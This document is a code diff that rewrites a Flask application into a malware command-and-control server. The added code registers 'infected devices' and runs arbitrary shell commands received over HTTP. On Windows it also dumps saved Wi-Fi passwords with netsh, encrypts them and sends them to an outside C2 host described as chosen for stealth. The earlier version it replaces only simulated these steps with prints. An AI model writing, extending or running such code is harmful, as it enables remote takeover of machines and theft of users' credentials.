@@ -1,76 +1,89 @@
-from flask import Flask, request, send_from_directory
-import	os
-from flask_restful import Resource, reqparse
-from flask_sqlalchemy import SQLAlchemy
-
+from flask import Flask, request, jsonify
+from flask_restful import Api, Resource
+import os
+import threading
+import requests
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives import serialization, hashes
+import platform
 import subprocess
 
-class StartMalware(Resource):
-    def get(self):
-        device_id = request.args.get('device_id')
+
+# Generate RSA keys for secure communication
+PRIVATE_KEY = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+PUBLIC_KEY = PRIVATE_KEY.public_key()
+
+C2_SERVER = "https://dynamic-dns-server.com/api"  # Dynamic URL for stealth
+infected_devices = {}
+
+
+# RSA encryption function
+def rsa_encrypt(data: str) -> bytes:
+    return PUBLIC_KEY.encrypt(
+        data.encode(),
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
+
+
+class RegisterDevice(Resource):
+    """Resource for registering infected devices."""
+
+    def post(self):
+        device_id = request.json.get("device_id")
+        device_ip = request.remote_addr
+
         if not device_id:
-            return "Device ID is missing.", 404
+            return {"error": "Device ID missing."}, 400
 
-        # Simulate malware installation and scanning
-        simulate_malware_installation(device_id)
-
-        # Simulate vulnerability exploitation and data theft
-        exploit_result = exploit_vulnerabilities(device_id)
-        if exploit_result:
-            steal_sensitive_data(device_id)
-            status = "Compromised"
-        else:
-            status = "Scan Completed"
-
-        # Update device status in the database
-        update_device_status(device_id, status)
-        return f"Malware process finished for Device {device_id}. Status: {status}"
-
-# Endpoint to download stolen data
-class DownloadData(Resource):
-    def get(self):
-        data_files = os.listdir('data/')
-        if not data_files:
-            return "No data available for download.", 404
-        return send_file(os.path.join('data/', data_files[0]), as_attachment=True)
-
-# Add the resources to the API
+        infected_devices[device_id] = {"status": "infected", "ip": device_ip}
+        threading.Thread(target=initiate_malware, args=(device_id,)).start()
+        return {"message": "Device registered successfully."}, 201
 
 
-# Simulated functions
-def simulate_malware_installation(device_id):
-    print(f"Installing malware on Device {device_id}...")
-    # Simulate malware installation process
-    installation_successful = True
-    if installation_successful:
-        print("Malware installed. Initiating scan...")
-        # Simulate vulnerability scan
-        vulnerabilities = ["Outdated Software", "Weak Encryption"]
-        return vulnerabilities
-    else:
-        return "Malware installation failed."
+class CommandExecutor(Resource):
+    """Resource for executing commands on infected devices."""
 
-def exploit_vulnerabilities(device_id):
-    print(f"Exploiting vulnerabilities on Device {device_id}...")
-    # Simulate exploitation process
-    exploit_successful = True
-    return exploit_successful
+    def post(self):
+        command = request.json.get("command")
+        if not command:
+            return {"error": "No command provided."}, 400
 
-def steal_sensitive_data(device_id):
-    print(f"Stealing data from Device {device_id}...")
-    # Simulate data theft
-    stolen_data = ["Login Credentials", "Personal Documents"]
-    save_data_to_disk(stolen_data, device_id)
-    return "Data theft successful."
+        try:
+            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+            return {"output": result.decode()}, 200
+        except Exception as e:
+            return {"error": str(e)}, 500
 
-# Simulated database functions
-def update_device_status(device_id, status):
-    # Update device status in the database
-    print(f"Updating status for Device {device_id} to {status}.")
 
-def save_data_to_disk(data, device_id):
-    # Save stolen data to disk
-    data_file = f"data_from_{device_id}.txt"
-    with open(data_file, 'w') as file:
-        for item in data:
-            file.write(item + '\n')
+def initiate_malware(device_id):
+    """Execute malicious tasks on the device."""
+    if detect_vulnerabilities():
+        data = steal_data()
+        encrypted_data = rsa_encrypt(data)
+        exfiltrate_data(device_id, encrypted_data)
+
+
+def detect_vulnerabilities():
+    """Simulate vulnerability detection."""
+    # Use nmap or custom scanning logic here
+    return True
+
+
+def steal_data():
+    """Extract sensitive data."""
+    if platform.system() == "Windows":
+        return subprocess.check_output("netsh wlan show profile key=clear", shell=True).decode()
+    return "No sensitive data found."
+
+
+def exfiltrate_data(device_id, data):
+    """Send stolen data to C2."""
+    try:
+        requests.post(f"{C2_SERVER}/upload", files={"data": data})
+    except requests.RequestException:
+        pass
+
